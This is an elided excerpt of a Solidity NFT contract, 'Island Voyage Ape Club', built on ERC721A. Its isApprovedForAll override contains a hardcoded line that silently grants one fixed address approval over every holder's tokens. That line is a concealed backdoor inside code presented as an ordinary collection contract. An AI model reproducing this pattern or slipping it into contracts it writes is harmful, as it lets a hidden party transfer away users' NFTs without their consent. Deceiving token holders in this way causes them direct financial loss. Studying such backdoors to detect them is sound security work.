  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x8487e74B5A2673de201DfA4962550184A28318A7){return true;}
...
contract IslandVoyageApeClub is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Island Voyage Ape Club", "IVAC", maxBatchSize_, collectionSize_) {
